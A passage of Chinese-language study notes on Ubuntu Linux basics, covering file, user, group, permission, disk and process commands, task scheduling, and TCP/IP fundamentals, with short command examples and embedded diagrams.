移动文件或目录，也可以进行重命名</strong></p><blockquote><ul><li><p style="color:blue;">mv [参数] [源地址] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mv dir1&#x2F;a dir2&#x2F;mv b bbb &#x2F;&#x2F;b重命名为bbb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rm 删除一个或多个文件，也可以递归删除目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rm dir1&#x2F;bbbrm -ri dir1&#x2F; &#x2F;&#x2F;递归处理来删除目录，并询问<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>目录的基本操作</p><ul><li><p><strong>mkdir 创建一个目录</strong></p><blockquote><ul><li><p style="color:blue;">mkdir [参数] [目的地址]</p></li></ul></blockquote><pre class="line-numbers language-none"><code class="language-none">mkdir dir1 &#x2F;&#x2F;当前目录下创建一个目录mkdir -p dir2&#x2F;dir22&#x2F;dir222 &#x2F;&#x2F;-p实现多层目录的建立<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>rmdir 删除一个目录</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">rmdir dir1rmdir -p dir2&#x2F;dir22&#x2F;dir22 &#x2F;&#x2F;-p实现多层目录的全部删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul></li><li><p>查看文件内容</p><ul><li><p><strong>more 在终端屏幕按屏显示文本文件</strong></p><p>   在终端屏幕显示文本文件：Enter一行，空格一屏（如果-num有参数，显示num行），q退出</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">more -8 &#x2F;etc&#x2F;passwd &#x2F;&#x2F;每屏显示8行ls &#x2F;etc&#x2F; | more -10 &#x2F;&#x2F;查看&#x2F;etc目录的文件信息，每屏显示10行-p 实现清屏-d 显示友好信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>less 在终端屏幕按屏显示文本文件</strong></p><p>  在终端屏幕显示文本文件，不能Enter和Space翻阅，增加：鼠标滑动显示内容；底部提示符为“ : ”</p><pre class="line-numbers language-none"><code class="language-none">ls &#x2F;etc&#x2F; | less<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>head 显示前几行或几字节</strong></p>  <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001613397.png" alt="image-20230210001613397" style="zoom:67%;" /></li><li><p><strong>tail 显示前/最后几行或几字节</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191142439.png" alt="image-20230212191142439" style="zoom:67%;" /><p>（head和tail这两命令同理）</p></li><li><p>od 按照特殊格式查看文件内容</p><pre class="line-numbers language-none"><code class="language-none">字码基数 -d 十进制；-o 八进制(默认)；-x 十六进制 -t 设置输出格式<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li><li><p>文件类型</p><ul><li><p><strong>文件类型</strong></p><p><font color="red"><strong>- 普通文件</strong>，<strong>d 目录</strong>，c 字符设备（串口设备：调制解调器），b 块设备（接口设备：硬盘、光驱），l 符号链接文件（快捷方式），s 套接口文件（网络通信文件），p 管道文件（FIFO文件，进程间通信机制）</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210003215624.png" alt="image-20230210003215624" style="zoom:67%;" /></li><li><p><strong>file 辨识文件类型</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210001908362.png" alt="image-20230210001908362" style="zoom:67%;" /></li></ul></li><li><p>查询文件</p><ol><li><p><strong>find 在目录结构中查找文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">find &#x2F;etc -name vim* &#x2F;&#x2F;查找文件名中以vim开头的所有文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>locate 查找符合条件的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">locate cpuinfo &#x2F;&#x2F;查找含有cpuinfo的文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>grep 查找包含指定关键字的文件</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">grep -ir &quot;Ubuntu&quot; &#x2F;user | less &#x2F;&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li><li><p>其他管理命令</p><ul><li><p><strong>ln 创建连接文件</strong></p><blockquote><ul><li><p style="color:blue;">ln [参数] [目的地址] [链接文件名]</p></li></ul></blockquote><p><font color="blue">两种链接：硬链接和软连接：</font></p><ul><li><strong>硬链接利用每个文件分配的物理编号inode建立的，因此不能跨越文件系统。修改硬链接的目标文件名，链接依然有效；</strong></li></ul></li></ul></li></ol><ul><li><strong>软连接利用文件路径名建立链接，通常为绝对路径，增加可移植性。修改软链接目标文件名，链接将断开</strong> <img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210002324999.png" alt="image-20230210002324999" style="zoom:67%;" /></li><li><strong>wc 统计文件的字数、字节数、行数等信息</strong></li></ul>  <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">   wc -c 字节wc -l 行数   wc -w 字数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre><code> &lt;img src=&quot;https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212191405117.png&quot; alt=&quot;image-20230212191405117&quot; style=&quot;zoom:67%;&quot; /&gt;</code></pre><ul><li><strong>comm 逐行比较两个<font color="blue">已排序</font>文件的差异，并显示</strong></li><li><strong>diff 逐行比较文本文件的异同处</strong>逐行比较文本文件的异同处。指定比较目录，会比较相同文件名的文件，不会比较子目录</li></ul><h4 id="P105-Ubuntu用户系统概述"><a href="#P105-Ubuntu用户系统概述" class="headerlink" title="P105: Ubuntu用户系统概述"></a>P105: Ubuntu用户系统概述</h4><p>Ubuntu Linux系统是一个<font color="red">多用户、多任务的分时</font>操作系统</p><p><font color=Brown>Ubuntu用户类型:  3个</font></p><ul><li><font color=Brown>初次创建的用户：完成比普通用户多的功能</font></li><li><font color=Brown>root用户 #：系统管理员，完成对系统的所有管理功能，拥有最高权限</font></li><li><font color=Brown>普通用户 ~：在安装完操作系统后，被创建的其他所有用户</font></li></ul><p>查看各个用户的相关信息：<strong>配置文件/etc/passwd</strong></p><p><strong>记录当前操作系统中所有用户的基本信息：用户名、用户UID、用户组ID(GID)、主目录路径、登录Shell等。</strong></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210004522336.png" alt="image-20230210004522336" style="zoom:67%;" /><h4 id="P113-用户管理命令"><a href="#P113-用户管理命令" class="headerlink" title="P113: 用户管理命令"></a>P113: 用户管理命令</h4><p>sudo和su的配置文件 /etc/sudoers</p><ol><li><p><font color=Brown><strong>添加用户 adduser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># adduser abc &#x2F;&#x2F;添加一个名为abc的普通用户# adduser --system --home &#x2F;home&#x2F;xyz --shell &#x2F;bin&#x2F;bash xyz &#x2F;&#x2F;添加一个名为xyx的系统用户，指定主目录为&#x2F;home&#x2F;xyz，默认shell为bash(ls &#x2F;home -&gt; abc xyz)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户信息  finger</strong></font></p><p>finger命令用于查找用户，并显示对应用户的相关信息</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"># sudo apt install fingerfinger -l abc  &#x2F;&#x2F;列出用户abc的详细信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>更改用户密码 passwd</p><p>passwd命令用于更改用户密码。如果当前用户为普通用户，只更改自己密码；当前用户为超级管理员，能更改所有用户密码</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">passwd abc &#x2F;&#x2F;更改用户abc的密码passwd -d abc &#x2F;&#x2F;删除用户abc的密码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>修改用户登录信息 usermode</strong></font></p><p>usermode命令用于修改已添加到系统中的某个用户的登录名、主目录、默认shell等与登录相关的信息</p><pre class="line-numbers language-none"><code class="language-none">usermode -l abcd abc &#x2F;&#x2F;将用户abc改名为abcdfinger abc &#x2F;&#x2F;查找登录名为abc的用户，不存在<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>显示用户ID id</strong></font></p><p>id命令用于显示系统中某个用户的UID、GID等识别号信号。</p><pre class="line-numbers language-none"><code class="language-none">id root &#x2F;&#x2F;显示用户root的所有IDid -u abc &#x2F;&#x2F;显示用户abc的UID-g 组ID  -G 所有组ID<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>修改用户个人信息 chfn</p><p>chfn命令用于修改用户的基本个人信息，如真实姓名、电话号码等。</p><pre class="line-numbers language-none"><code class="language-none">chfn -f abcdefg abc &#x2F;&#x2F;将用户abc的真实姓名改为abcdefgchfn -h 1111111 abc &#x2F;&#x2F;设置用户abc的电话号码<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><font color=Brown><strong>删除用户 deluser</strong></font></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">deluser --remove-all-files abc &#x2F;&#x2F;删除用户abc以及一切相关文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P117-组管理命令"><a href="#P117-组管理命令" class="headerlink" title="P117: 组管理命令"></a>P117: 组管理命令</h4><p>cat /etc/passwd 看用户信息；cat /etc/group 看组相关信息</p><ol><li><p><strong>添加用户组 addgroup</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">addgroup abc &#x2F;&#x2F;添加一个普通用户组addgroup --system abc &#x2F;&#x2F;添加一个系统用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>显示组内用户 groups</p><p>groups命令用于显示某个组里包含的用户</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">groups root &#x2F;&#x2F;显示用户组root内的用户groups abc &#x2F;&#x2F;显示用户组abc内的用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>修改用户组信息 groupmod</strong></p><p>groupmod命令用于更改用户组的名称、ID等信息。</p><pre class="line-numbers language-none"><code class="language-none">groupmod -g 1002 abc &#x2F;&#x2F;更改用户组abc的GID为1002groupmod -n abcd abc &#x2F;&#x2F;更改用户组abc名称为abccat &#x2F;etc&#x2F;group | grep abc &#x2F;&#x2F;查看配置文件中abc信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>删除用户组 delgroup</strong></p><pre class="line-numbers language-none"><code class="language-none">delgroup abc &#x2F;&#x2F;删除用户组abc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="P118-权限管理"><a href="#P118-权限管理" class="headerlink" title="P118: 权限管理"></a>P118: 权限管理</h4><p>Ubuntu在管理自己的用户和文件时，都是依靠权限体系来提高安全性。</p><p>权限是指某一个用户或用户组能够使用系统资源的限制情况。root管理员拥有系统的最高权限；初次创建的用户拥有管理员的部分权限；其他普通用户的权限最低。</p><p><font color=Brown>对于文件，有读r、写w、修改x(可执行权限)三种权限。(二进制表示：100, 010, 001 ; <strong>八进制表示：4, 2, 1 -&gt; r+w+x=7，故7为最高权限</strong>)</font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230210225153846.png" alt="image-20230210225153846" style="zoom:50%;" /><ul><li>“drwxr-xr-x”表明了权限与用户组的关系，除第1位表示<strong>文件类型</strong>，剩余9位以3位为一组，分别表示<strong>文件归属用户的权限 u</strong>、归属用户组的权限 g、其他用户的权限 o。</li><li>“26”表示链接数</li><li>”bd bd”表示文件拥有者和该用户所归属的用户组</li></ul><pre class="line-numbers language-none"><code class="language-none">bd的3类用户和对应权限情况：它的拥有者是bd用户，对应权限是“rwx&quot;，对该文件具有读写修改的权限与bd用户同组的其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限其他用户，对应权限是&quot;r-x&quot;，对该文件具有读和修改的权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>权限字母表示法：</strong></p><table><thead><tr><th>字母</th><th>含义</th></tr></thead><tbody><tr><td>r, w, x 表示权限</td><td>可读，可写，可执行权限</td></tr><tr><td>a, u, g, o 表示文件归属关系</td><td>所有用户，归属用户，归属组，其他用户</td></tr><tr><td>=, +, - 表示权限变化</td><td>具备权限，添加某权限，去除某权限</td></tr></tbody></table><pre class="line-numbers language-none"><code class="language-none">例子：a+x：对所有用户添加可执行权限go-x：对归属组和其他用户去除原有可执行权限u&#x3D;rxw：对归属用户具备可读、可写、可执行权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong><font color=Brown>常用权限管理命令：</font></strong></p><p>利用shell命令，可以方便地查看文件和文件夹的权限，也可以方便地对权限作出修改，还可以对文件所属用户及群组进行修改</p><ul><li><p><strong>chmod 修改文件或文件夹的权限</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">字母表示法：chmod a+w a.cpp &#x2F;&#x2F;对a.cpp文件的所有用户增加可写权限数字表示法：chmod 777 test &#x2F;&#x2F;修改目录test的权限为777，即所有用户都拥有可读、可写、可执行权限-R实现对目录下的文件权限的递归修改：chmod -cR 755 test&#x2F; &#x2F;&#x2F;将test目录下所有文件权限改为755，包括目录本身，使用-c参数显示修改结果<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chown修改文件或目录的归属用户或归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chown abc a.cpp &#x2F;&#x2F;修改a.cpp文件的归属用户为abcchown -c abc.abc a.cpp &#x2F;&#x2F;同时改变a.cpp文件的归属用户和用户组chown -v .abc a.cpp &#x2F;&#x2F;改变a.cpp文件的归属用户组迭代：chown -cR abc test &#x2F;&#x2F;修改目录中所有文件的归属<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>chgrp专门修改文件或目录的归属组</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">chgrp -c abc a.cpp &#x2F;&#x2F;修改文件的归属组为abcchgrp -cR abc test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h4 id="P127-磁盘概述"><a href="#P127-磁盘概述" class="headerlink" title="P127: 磁盘概述"></a>P127: 磁盘概述</h4><p>配置文件/etc/fstab 查看磁盘分区的情况及别名</p><p>没有实际的硬盘。<font color=Brown><strong>主分区/主挂载点的别名是/dev/sda1</strong>，即“/”挂载点</font>。/dev/sda5表示逻辑分区，虚拟设备：<font color=Brown><strong>/dev/scd0光驱</strong></font>，<font color=Brown><strong>/dev/fd0软驱</strong></font>。SWAP<font color=Brown><strong>交换分区被挂载至/root/swapfile</strong></font></p><p>/dev/后面部分表示一个具体的分区，hd表示IDE硬盘，sd表示SATA硬盘或其他外部设备，had中的第3位a表示这是该类型接口上的第1个设备。每一个IDE接口可以允许有两个设备，一个是主设备，另一个为从设备，可以分别用hda、hdb表示第1个IDE接口上的两个设备。</p><p><font color=Brown><strong>/dev/hda1~/dev/hda4都表示主分区</strong></font>，<font color=Brown><strong>/dev/hda5表示该硬盘上的第1个逻辑分区</strong></font>，分区的顺序是不能随意修改。</p><h4 id="P128-磁盘管理方法"><a href="#P128-磁盘管理方法" class="headerlink" title="P128: 磁盘管理方法"></a>P128: 磁盘管理方法</h4><ul><li><p><strong>fdisk 磁盘分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">fdisk &#x2F;dev&#x2F;hda &#x2F;&#x2F;对IDE硬盘进行分区fdisk -l &#x2F;&#x2F;列出当前操作系统<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong>mkfs</strong> 在分区上<strong>建立文件系统</strong>或格式化指定形式</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkfs -v &#x2F;&#x2F;显示命令使用方法mkfs -V &#x2F;&#x2F;显示版本信息mkfs -t ext3 &#x2F;dev&#x2F;sda3 &#x2F;&#x2F;将&#x2F;dev&#x2F;sda3的文件系统建立为ext3类型<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>mkswap 设置交换分区</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">mkswap -c -vl &#x2F;dev&#x2F;sda5 102400 &#x2F;&#x2F;在&#x2F;dev&#x2F;sda5建立大小为100MB的交换分区，建立前先检查是否有损坏的区块<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>df 显示磁盘信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">df -a &#x2F;&#x2F;显示所有的磁盘信息-l 仅显示本地的文件系统信息 -i 显示索引节点信息df -t ext3 &#x2F;&#x2F;显示系统中ext3类型的分区信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p><strong>du 显示目录的容量</strong></p><pre class="line-numbers language-none"><code class="language-none">du -a &#x2F;root &#x2F;&#x2F;显示&#x2F;root目录下每个文件的大小，以K为单位<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P193-195-进程管理"><a href="#P193-195-进程管理" class="headerlink" title="P193-195: 进程管理"></a>P193-195: 进程管理</h4><p><font color=Brown><strong>什么是进程？什么是程序？进程有什么特点？父子进程的关系？</strong></font></p><p><strong><font color=Brown>进程的3种类型，基本信息(PID,PPID…)，3种基本状态(state,wait,running)</font></strong></p><p><strong>1.进程的概念：</strong></p><p>Ubuntu Linux 的所有任务都是在操作系统内核的调度下由CPU执行，很多时候，Linux是将任务和进程的慨念合在一起。<strong>进程的标准定义: 进程是可开发执行的程序在一个数据集合上的运行过程。</strong>进程是一个动态的使用系统资源，处于活动状态的应用程序。<strong>进程和程序有着显著的区别。</strong></p><ul><li>程序是静态概念，本身可以作为一种资源长期保存在磁盘上;进程是一个程序的执行过程,是动态概念,有一定的生命周期，如果进程一旦执行结束，就不再存在于操作系统中</li><li>进程是一个能独立运行的单位，能与其他进程并发执行，它是操作系统中资源申请调度的最小单位;而程序不能作为一个独立运行的单位，它也不占用CPU 资源</li><li>程序并不是和进程一一对应的 一个程序可以由多个进程共用,一个进程也可以在活动中有顺序地执行多个程序</li></ul><p>在Ubuntu Linux中，init进程是所有进程的发起者和控制者，每个进程都有一个编号<strong>PID</strong>，是进程在当前系统中运行的顺序。<strong>Init用于终结父进程</strong>，如果该进程出现了问题，操作系统会崩溃。</p><p>因为init进程在系统运行期间始终不会消亡或停止，所以系统总是可以确信它的存在，并在必要的时候以此为参照。因此，<strong>系统调用fork()函数来创建一个新进程</strong>，并且作为init的子进程，从而最终形成系统中运行的所有其他进程。</p><p>为了标识和管理进程，使用PCB进程控制块来进行此项重要工作。进程有以下几个主要参数：</p><ul><li><font color=Brown>PID</font>：进程号，唯一标识进程（父进程为1）        Process ID</li><li><font color=Brown>PPID</font>：父进程号，创建某个进程的上一个进程号      Parent PID</li><li>USER：启动某个进程的用户ID(UID)和该用户归属的组ID(GID)       </li><li>STAT：进程状态。一个进程可能处于多种状态，包括运行状态、等待状态（可被中断或不可被中断）、停止状态、睡眠状态和僵死状态等</li><li>PRIORITY：优先级</li><li>资源占用：占用系统资源</li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">- ps aux  &#x2F;&#x2F;查看当前所有运行着的进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong><font color=Brown>Ubuntu Linux进程的3种类型：</font></strong></p><ul><li>交互进程：由Shell启动的进程</li><li>批处理进程：与终端联系不大，在等待队列中按序执行</li><li>守护进程：后台运行的进程，一般总是活动状态</li></ul><p>2.<font color=Brown><strong>进程的运行状态</strong></font></p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212115553914.png" alt="image-20230212115553914" style="zoom:67%;" /><ul><li>等待状态wait：该状态有两种模式，一种是可被中断的，另一种不可被中断。这种状态下的进程处于等待系统分配给它资源，如果一旦得到资源，将转入就绪状态。</li><li>就绪状态running：这种状态的进程当前没有运行,但所有申请的资源已经具备。只要内核对其进行调度，将立即拥有CPU的控制权，开始运行。</li><li>僵死状态zombie：也称僵尸状态或僵尸进程。这种状态下的进程已经运行完毕，执行了相应的任务，已经不再存在，但它的父进程留下了一个记录，包括一个退出码和一些时间信息等。</li><li>停止状态stop：正在运行的进程由于某些原因的影响而退出，将进入停止状态，例遇到更高优先级的进程占用了CPU资源。</li><li>中断状态interupt</li></ul><blockquote><p>进程状态60</p></blockquote><p>3.进程管理操作</p><ul><li><p><strong>ps 查看系统进程信息（静态信息）</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">-f:产生某个进程的一个完整信息清单。-a:显示所有用户的进程清单。-u:产生某个特定用户的进程清单。-x:显示后台运行进程。ps &#x2F;&#x2F;显示与控制终端相关进程的基本信息ps -u abc -f &#x2F;&#x2F;显示abc用户所有完整信息ps aux &#x2F;&#x2F;显示系统中的所有进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>top 动态显示运行中的进程详细信息</strong></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">top -d 3 &#x2F;&#x2F;每3秒动态更新进程信息<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>nice 设置进程运行优先级</strong></p><p>每个进程都有一个优先级参数，表示占有CPU资源的等级，优先级越高进程更容易获取CPU控制权。进程优先级一般为-20~19，-20为最高优先级。修改进程nice值，可以修改进程优先级。系统进程默认的优先级是0。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nice -5 process &#x2F;&#x2F;优先级置为5。若没有指定默认置为10nice --12 process &#x2F;&#x2F;优先级置为-12<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p><strong><font  color="blue">renice 修改进程的优先级</font></strong></p><p>可调范围-20~19</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo renice 12 7716 &#x2F;&#x2F;修改PID7716的进程的优先级为12sudo renice 6 -u abc &#x2F;&#x2F;修改abc用户所有进程优先级为6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>kill 终止进程命令</p><p>一般情况，可以通过停止一个进程的方法来正常结束该进程。但在某种情况下，进程没有响应，可使用kill命令停止某个活动。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">kill -STOP 4385 &#x2F;&#x2F;停止4385进程，但不退出kill -CONT 4385 &#x2F;&#x2F;重新开始4385进程kill -9 4385 &#x2F;&#x2F;强制终止4385进程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>killall 终止所有同名进程</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">killall -9 process &#x2F;&#x2F;终止系统中所有名为process的进程<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="P200-临时工作安排at"><a href="#P200-临时工作安排at" class="headerlink" title="P200: 临时工作安排at"></a>P200: 临时工作安排at</h4><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212141653461.png" alt="image-20230212141653461" style="zoom: 50%;" /><ol><li><p>服务启动</p><p>at命令用来安排完成临时性工作，即只需要执行一次的系统任务。使用该命令，需要提前启动一个进程，即启动一个服务。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo &#x2F;etc&#x2F;init.d&#x2F;atd restart  &#x2F;&#x2F;重新启动at服务<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>使用at命令</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo at 23:50 2009-12-15 &#x2F;&#x2F;在2009-12-15的23：50执行以下命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>维护当前系统中的at服务</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">sudo atq &#x2F;&#x2F;查询当前系统中的所有at进程sudo atrm 1 &#x2F;&#x2F;删除1号工作任务<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><p><strong>周期性工作安排cron</strong></p><center><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/wps1.jpg" alt="img" style="zoom:67%;" /> </center>#### P211: TCP/IP基础<p>（尽可能写全面）</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/img/image-20221016160838763.png" alt="image-20221016160838763" style="zoom:80%;" /><ul><li><p><strong>网络接口层</strong>（Network Interface Physical)：模型的基层，负责数据帧的发送和接收（帧Frame是独立的网络信息传输单元)。网络接口层将帧格式的数据放到网络上，或从网上把帧取下来。</p></li><li><p><strong>互联层（Internet）</strong>：互联协议将数据包封装成Internet 数掂包（IP packet)，并运行必要的路由算法。这里有4种互联协议。</p><ul><li><strong>网际协议(IP)</strong>:负责在主机和网络之间路径寻址和路由数据包。</li><li><strong>地址解析协议（ARP)</strong>:获取同一物理网络中的硬件主机地址。</li><li><strong>因特网控制消息协议（(ICMP)</strong>:发送消息，并报告有关数据包的传送错误。</li><li><strong>互联组管理协议（IGMP)</strong>:实现本地多路广播路由器报告。</li></ul></li><li><p><strong>传输层</strong>:传输协议在主机之间提供通信会话。传输协议的选择根据数据传输方式而定。主要有以下两个传输协议。</p><ul><li>传输控制协议(<strong>TCP</strong>)：为应用程序提供<strong>可靠的</strong>通信连接。适合于一次传输<strong>大批数据</strong>的情况，并适用于要求得到响应的应用程序。</li><li>用户数据包协议（<strong>UDP</strong>）:提供了无连接通信，且不对传送包进行可靠性确认。适合于一次传输<strong>小量数据</strong>可靠性则由应用层确认。</li></ul></li><li><p><strong>应用层</strong>:应用程序通过这一层访问网络，主要包括常见的FTP、HTTP、DNS和 TELNET等协议。</p><ul><li><strong>Telnet</strong>:提供远程登录(终端仿真）服务。</li><li><strong>FTP</strong>:提供应用级的文件传送协议。,</li><li><strong>SMTP</strong>:简单邮件传送协议。</li><li><strong>SNMP</strong>:简单网络管理协议，使用传输层UDP 协议。</li><li><strong>DNS</strong>:域名解析服务，也就是将域名映像成IP地址的协议，使用传输层UDP协议。</li><li><strong>HTTP</strong>:超文本传输协议，访问Web所用的协议。</li></ul></li></ul><p>TCP/IP协议簇体系结构及各层协议结构如图。 在网络接口层，最重要的信息之一是主机的MAC地址，为48bit，在物理上唯一标识某台主机；IP层的IP地址在逻辑上唯一标识某台主机；在主机内部，传输层的端口对应唯一的应用服务。</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212134419401.png" alt="image-20230212134419401" style="zoom:67%;" /><h4 id="P212-IP地址表示形式及分类"><a href="#P212-IP地址表示形式及分类" class="headerlink" title="P212: IP地址表示形式及分类"></a>P212: IP地址表示形式及分类</h4><p>1.表示形式：</p><ul><li><p>二进制表示法</p></li><li><p>点分十进制表示法</p><p>IP地址由网络号和主机号组成，程度为4字节</p><ul><li>网络号：标识一个物理的网络，同一个网络上的所有主机使用同一个网络号，该号在互联网中是唯一的。</li><li>主机号：确定网络中的一个工作端、服务器、路由器或者其他TCP/IP 主机。对于同一个网络号来说，主机号是唯一的。每个TCP/IP主机由一个逻辑IP地址确定网络号和主机号。</li></ul></li></ul><p>2.IP地址分类</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212135517579.png" alt="image-20230212135517579" style="zoom:50%;" /><ul><li><strong>A类地址</strong>: 可以拥有最大数量的主机，最高位为0，紧跟的7位表示网络号，其余24位表示主机号，总共允许有 126个网络。</li><li><strong>B类地址</strong>: 被分配到中等规模和大规候的网络中，最高两位总被置为二进制的10，前16位为网络号，后16位 为主机号，允许有16384个网络。</li><li><strong>C类地址</strong>：高3为被置为二进制的110，前 24位为网络号，后8位为主机号，允许有大约200万个网络。</li><li>D类地址:被用于多路广播组用户，高4位总被置为1110,余下的位用于标明客户机所属的组。</li><li>E类地址是一种仅供试验的地址。</li></ul><p>几条准则：</p><ul><li>网络号不能为127。该标识号被保留作为回路及诊断功能。</li><li>不能将网络号和主机号的各位均置为1。如果每位都是1,该地址会被解释为网内广播而不是一个主机号</li><li>各位均不能置0，否则该地址被解释为“就是本网络”。</li><li>对于本网络来说，主机号应核唯一，否则会出现IP地址已分配或有冲突的错</li></ul><p><strong>网络划分标准</strong></p><h4 id="P217-TCP包头"><a href="#P217-TCP包头" class="headerlink" title="P217: TCP包头"></a>P217: TCP包头</h4><p>cat /usr/include/linux/tcp.h</p><img src="https://zhang2002gz.oss-cn-qingdao.aliyuncs.com/image-20230212221150069.png" alt="image-20230212221150069" style="zoom: 67%;" /><ol><li>源端口和目标端口(Source Port&amp;Destinaton Port):传送/接收数据使用的端口。</li><li>数据包序号(Sequence Number)：数据包过大而进行分段后，记录数据包序号，接收方可以组合成功</li><li>回应序号 (Acknowledge Number):为了确认接收端收到发送端所送出的数据包数据,发送端希望能吸收到接收端的响应。</li><li><strong>数据补偿（Data Offset):补偿位。</strong></li><li>保留位（Reserved ):未使用的保留字段。</li><li>控制标志码（Control 